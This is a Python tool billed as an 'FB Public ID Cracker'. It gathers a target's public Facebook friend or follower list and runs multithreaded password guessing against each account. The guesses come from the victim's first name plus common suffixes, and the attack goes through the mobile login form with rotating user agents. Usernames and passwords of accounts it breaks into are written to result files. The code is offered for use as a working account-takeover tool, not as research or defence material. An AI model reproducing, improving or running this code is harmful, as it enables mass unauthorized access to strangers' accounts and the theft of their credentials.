#########################################
# Coded By HunterSl4d3
# A Product Of ToxicNoob
# https://github.com/Toxic-Noob/
# You Have No Permission To Copy Any Code
#########################################

import time, os, sys, json
import itertools, threading
import requests
import calendar, random
import mechanize
import bs4
import concurrent.futures as cf
from datetime import datetime
from datetime import date
from bs4 import BeautifulSoup as parser
from lib.gen_token import *


user_agents = ["Mozilla/5.0 (Linux; arm; Android 8.1.0; LM-Q610.FGN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaApp_Android/11.30 YaSearchBrowser/11.30 BroPP/1.0 SA/1 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"]


def psb(z):
    for k in z + "\n":
        sys.stdout.write(k)
        sys.stdout.flush()
        time.sleep(0.03)

def psbn(z):
    for k in z + "\n":
        sys.stdout.write(k)
        sys.stdout.flush()
        time.sleep(0.007)

def logopsb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)

rows, column = os.popen('stty size', 'r').read().split()

def logo():
    os.system("clear")
    logopsb("\033[92m  ____                _    _____ ____  \n / ___|_ __ __ _  ___| | _|  ___| __ ) \n| |   | '__/ _` |/ __| |/ / |_  |  _ \ \n| |___| | | (_| | (__|   <|  _| | |_) |\n \____|_|  \__,_|\___|_|\_\_|   |____/ \n                                       ")
    logopsb("\033[3;90m                A Product Of ToxicNoob\033[0;92m")
    time.sleep(0.6)
    logopsb("\n"+"\033[94m*"*int(column)+"\n\033[95;3m Author   \033[0;95m:\033[3;95m ToxicNoob\n\033[3m Tool     \033[0;95m:\033[3;95m FB Public ID Cracker\n\033[3m Version  \033[0;95m:\033[3;95m 2.4\n\033[3m GitHub   \033[0;95m:\033[3;95m https://www.github.com/Toxic-Noob/\n\033[3m Coded By \033[0;95m:\033[3;95m HunterSl4d3\n"+"\033[0;94m*"*int(column))
    time.sleep(0.8)


###GetToken###
def token_data():
    if os.path.exists(".token"):
        data = open(".token", "r").read()
    else:
        login_menu()
        data = open(".token", "r").read()
    return data

###UserLogin###
def login():
        token = token_data()
        url = "https://graph.facebook.com/me?access_token="+token
        req = requests.get(url).text
        try:
            js = json.loads(req)
            login.name = js["name"]
            login.id = js["id"]
            login.bd = js["birthday"]
        except:
            logo()
            psb("\n\033[91m    [!] Token Expired or ID is In Checkpoint...\033[37m")
            k = input("\n\033[92m    [*] Press Enter To Go To Login Menu....")
            login_menu()
            login()
        

###UserData###
def user_data():
	name = login.name
	id = login.id
	bd = login.bd
	print("\033[93m*" * int(column), end ="")
	print("\n\033[92m	[*] User Name :\033[37;40m "+name)
	print("\033[92m	[*] BirthDay  :\033[37;40m "+bd)
	print("\033[92m	[*] User ID   :\033[37;40m "+id+"\033[92m")
	print("\033[93m*" * int(column), end ="")

###StartedAlert###
def started(name):
    logo()
    user_data()
    print("\n\033[92m    [*] Target Public ID : \033[37m"+name+"\n")
    print("\033[94m*" * int(column), end="")
    psb("\n\033[92m    [*] Cracking Process Started...")
    psb("    [*] Process May Take Some Time...")
    psb("    [*] Please Be Patient...")
    print("\033[94m*" * int(column), end="")
    print("\n")

###FriendsList###
def friend():
    token = token_data()
    uid = input("\n\033[92m    [*] Enter Public Friendlist ID:> \033[37m")
    usr = "https://graph.facebook.com/"+uid+"?access_token="+token
    usrdt = requests.get(usr).text
    js = json.loads(usrdt)
    try:
        name = js["name"]
    except:
        psb("\n\033[91m    [!] User Dose Not Exists!!\033[37m")
        sys.exit()
    print("\n\033[92m    [*] User Name : \033[37m"+name)
    url = "https://graph.facebook.com/"+uid+"/friends?access_token="+token
    re = requests.get(url).text
    try:
        re = json.loads(re)["data"]
    except:
        if ("permission denied" in json.loads(re)["error"]["message"].lower()):
            psb("\n\033[91m    [!] FriendList Cloning Is Not Available Right Now...")
            psb("    [!] Cause : \033[37mFacebook API Error!!\n")
            return
        psb("\n\033[91m    [!] Given User's FriendList Isn't Public!!\033[37m")
        sys.exit()
    started(name)
    with cf.ThreadPoolExecutor() as tp:
        tp.map(crack, re)
    print("Finished")


###FollowersList###
def follower():
    token = token_data()
    uid = input("\n\033[92m    [*] Enter Public Followers ID:> \033[37m")
    usr = "https://graph.facebook.com/"+uid+"?access_token="+token
    usrdt = requests.get(usr).text
    js = json.loads(usrdt)
    try:
        name = js["name"]
    except:
        psb("\n\033[91m    [!] User Dose Not Exists!!\033[37m")
        sys.exit()
    print("\n\033[92m    [*] User Name : \033[37m"+name)
    print("\033[92m    [*] Followers : \033[37m5000\n\033[92m")
    url = "https://graph.facebook.com/"+uid+"/subscribers?limit=5000&access_token="+token
    re = requests.get(url).text
    try:
        re = json.loads(re)["data"]
    except:
        psb("\n\033[91m    [!] Given User's FollowerList Isn't Public!!\033[37m")
        sys.exit()
    started(name)
    with cf.ThreadPoolExecutor() as tp:
        tp.map(crack, re)
    print("\033[92m\n\t\t[*] Finished [*]\033[37m")

###LogOut###
def logout():
    psb("\n\033[92m    [*] Please Wait, Logging Out...")
    try:
        os.system("rm .token")
    except:
        pass
    psb("\n    [*] Logged Out Successfully...")
    k = input("\n    [*] Press Enter To Go Back...")
    login_menu()

###CrackMenu###
def crack_menu():
    login()
    logo()
    user_data()
    psb("\n\033[92m    [*] Choose Your Option:")
    print("\n    [01] Public FriendList Cloning")
    print("    [02] Public Followers Cloning")
    print("    [03] Logout (Remove Token)")
    print("    [04] Exit")
    op = input("\n\033[92m    [*] Enter Your Option:> ").replace("0", "")
    while not (op in ["1", "2", "3", "4"]):
        psb("\n\033[91m    [!] Choose a Correct Option!")
        op = input("\033[92m\n    [*] Enter Your Choice:> "). replace("0", "")
    if (op == "1"):
        friend()
    elif (op == "2"):
        follower()
    elif (op == "3"):
        logout()
    elif (op == "4"):
        exit("\n\033[92m    [*] Thanks For Using Our Tool!!\033[37m\n")


###MainMenu###
def login_menu():
    logo()
    psb("\n\033[92m    [*] Choose Your Login Method: ")
    print("\n    [01] Login With Token ")
    print("    [02] Login With User Pass")
    print("    [03] Login With Cookie")
    print("    [04] Exit")
    op = input("\n    [*] Enter Your Choice:> "). replace("0", "")
    while not (op in ["1", "2", "3", "4"]):
        psb("\n\033[91m    [!] Choose a Correct Option!")
        op = input("\n    [*] Enter Your Choice:> "). replace("0", "")
    if (op == "1"):
        token_login()
    elif (op == "2"):
        email_login()
    elif (op == "3"):
        cookie_login()
    elif (op == "4"):
        exit("\n\033[92m    [*] Thanks For Using Our Tool!!\033[37m\n")
    

###MainProcess###
def crack(list_data, **kwargs):
    uid = list_data["id"]
    name = list_data["name"].rsplit(' ')[0].lower()
    if (len(name) < 3) or (name == "md") or (name == "angel"):
        name = list_data["name"].rsplit(' ')[1]
    host = "https://mbasic.facebook.com"
    pass1 = name+"12"
    pass2 = "12233445"
    if not (len(name) < 6):
        pass1 = name
        pass2 = name+"12"
    pass3 = name+"123"
    pass4 = name+"1234"
    pass5 = "123456"
    pwx = [pass1, pass2, pass3, pass4, pass5]
    ua = random.choice(user_agents)

    try:
        for pw in pwx:
            if len(uid) < 14:
                continue
            kwargs = {}
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
            p = ses.get(host + '/login/?next&ref=dbl&refid=8').text
            b = parser(p, 'html.parser')
            bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:
                        continue
                except:
                    pass

            kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
            re = ses.post(host + '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
            if 'c_user' in ses.cookies.get_dict().keys():
                ui = uid.replace("\n", "")
                print("\033[92m[ Toxic-OK ] : "+ui+"  |  "+pw+"\033[37m")
                file_data = open("results/ok.txt", "r").read()
                file_ok = open("results/ok.txt", "w")
                file_ok.write(file_data+"\n"+ui+"  |  "+pw)
                file_ok.close()
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                ui = uid.replace("\n", "")
                print("\033[91m[ Toxic-CP ] : "+ui+"  |  "+pw+"\033[37m")
                file_data = open("results/cp.txt", "r").read()
                file_cp = open("results/cp.txt", "w")
                file_cp.write(file_data+"\n"+ui+"  |  "+pw)
                file_cp.close()
                break
            elif "<title>error</title>" in re.text.lower():
                print("\n    [!] Error Occured!!")
                print("\n    [!] Try Again Later...")
                sys.exit()
            elif "Nomor telepon yang Anda masukkan tidak cocok dengan akun mana saja" in re.text or "Nombor telefon yang anda masukkan tidak sepadan dengan mana-mana akaun" in re.text:
                break
            elif "someting went wrong" in re.text.lower():
                file = open(".temp", "w")
                file.write(re.text)
                file.close()
    except Exception as e:
        print(e)


if __name__ == "__main__":
    if not os.path.exists("results"):
        os.mkdir("results")
    if not os.path.exists(".token"):
        login_menu()
    crack_menu()
